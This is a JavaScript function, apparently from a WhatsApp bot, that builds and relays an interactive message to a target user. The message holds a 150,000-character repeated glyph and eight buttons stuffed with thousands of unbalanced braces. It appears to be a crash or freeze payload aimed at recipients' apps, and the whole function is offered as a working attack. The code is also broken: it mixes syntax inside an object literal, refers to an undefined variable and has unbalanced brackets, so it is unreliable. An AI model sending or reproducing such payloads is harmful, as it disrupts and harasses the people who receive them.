async function ngeweButton(sheesh, objective) {
try{
const msg = generateWAMessageFromContent(objective, {
  message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "드림 가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐" + "ꦾ".repeat(150000),
          },
          nativeFlowMessage: {
            buttons: [
              {
              name: "single_select",
              ParamsJson: "",
              },
              {
              name: "call_permission_request",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              {
              name: "cta_url",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              {
              name: "cta_call",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              {
              name: "cta_copy",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              {
              name: "cta_cancel_reminder",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              {
              name: "address_message",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              {
              name: "quick_reply",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
              messageParamsJson: "{".repeat(1000),
            ],
          },
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 67676,
            businessMessageForwardInfo: {
              businessOwnerJid: objective,
            },
          },
        },
      },
    },
  },  
};
  await sheesh.relayMessage(objective, msg, {
    participant: { jid: objective },
  });
} catch (err) {
    console.error(chalk.red("BUG Error: "), err.message);
  }
}
